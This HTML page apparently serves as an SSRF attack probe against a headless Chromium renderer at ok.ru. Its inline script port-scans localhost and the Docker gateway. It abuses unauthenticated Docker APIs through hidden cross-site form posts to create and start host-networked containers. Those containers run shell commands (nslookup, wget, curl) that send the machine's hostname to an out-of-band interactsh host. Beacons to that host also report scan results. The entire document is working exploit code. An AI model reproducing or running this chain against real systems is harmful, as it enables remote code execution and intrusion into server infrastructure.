<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>OK</title></head>
<body>
<script>
'use strict';
// ok.ru Chromium SSRF — probe v11
// KEY CHANGES:
// - HTTPS OOB (works on 217.20.158.245 node; DNS also fires on short-lived nodes)
// - Phase 1: Start v10 containers IMMEDIATELY (sync) — they may exist from v10 creates
// - Phase 2: Port scan with 1400ms timeout (results arrive within 2s page lifetime)
// - Phase 3: Fresh create+start with 300ms start delay

const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);

// HTTPS OOB — DNS fires immediately; HTTP arrives once TLS established (~500ms)
const oob = label => { new Image().src = `https://${clean(label)}.${OOB}/`; };

const ffPost = (id, url, body) => {
  try {
    const ifr = document.createElement('iframe');
    ifr.name = `i${id}`; ifr.style.display='none';
    document.body.appendChild(ifr);
    const f = document.createElement('form');
    f.method='POST'; f.action=url; f.enctype='text/plain'; f.target=`i${id}`;
    if (body !== null) {
      const raw = JSON.stringify({...body, _x:''});
      const sp = raw.lastIndexOf('"_x":"');
      const inp = document.createElement('input');
      inp.name = raw.substring(0, sp+7);
      inp.value = '"}';
      f.appendChild(inp);
    }
    document.body.appendChild(f);
    f.submit();
  } catch(e) {}
};

oob(`v11-s-${clean(navigator.userAgent.substring(20,40))}`);

const rceCmd = `nslookup rce-ok.${OOB}; wget -qT5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sm5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"`;

// ── Phase 1: Start v10 containers IMMEDIATELY (sync) ──────────────────────
// v10 creates used names v{hi}{pi}{ii} at specific endpoints:
const V10 = [
  ['127.0.0.1', 2375, ['v000','v001']],
  ['127.0.0.1', 4243, ['v010','v011']],
  ['172.17.0.1', 2375, ['v100','v101']],
  ['172.17.0.1', 4243, ['v110','v111']],
];
let idx = 0;
V10.forEach(([ip, p, names]) => names.forEach(nm => {
  oob(`s10-${nm}`);
  ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
}));

// ── Phase 2: Port scan via fetch — results arrive via HTTPS OOB callbacks ──
const scan = (tag, url, ms) => {
  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms) })
    .then(() => oob(`${tag}-o`))
    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':'e'}`));
};
['127.0.0.1','172.17.0.1'].forEach(ip => [2375,4243,6379,8080].forEach(p => {
  scan(`sk-${ip.split('.').pop()}-${p}`, `http://${ip}:${p}/`, 1400);
}));

// Also direct Docker ping with readable response check
fetch('http://127.0.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
  .then(r => { oob(`dp-lo-${r.status}`); return r.text(); })
  .then(b => oob(`dp-lo-body-${clean(b.substring(0,6))}`))
  .catch(e => oob(`dp-lo-${clean((e.name||'u').substring(0,6))}`));

fetch('http://172.17.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
  .then(r => { oob(`dp-gw-${r.status}`); return r.text(); })
  .then(b => oob(`dp-gw-body-${clean(b.substring(0,6))}`))
  .catch(e => oob(`dp-gw-${clean((e.name||'u').substring(0,6))}`));

// ── Phase 3: Fresh creates with 300ms start delay ──────────────────────────
const DIPS = ['127.0.0.1','172.17.0.1'];
const DPORTS = [2375, 4243];
DIPS.forEach((ip,hi) => DPORTS.forEach((p,pi) => {
  ['busybox','alpine'].forEach((img,ii) => {
    const nm = `x${hi}${pi}${ii}`;
    const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
    oob(`cr-${nm}`);
    ffPost(`c${idx++}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
    const delay = 300 + ii*100;
    const fi = idx++;
    setTimeout(() => {
      oob(`st-${nm}`);
      ffPost(`s${fi}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
    }, delay);
  });
}));

oob('v11-e');
</script>
</body>
</html>
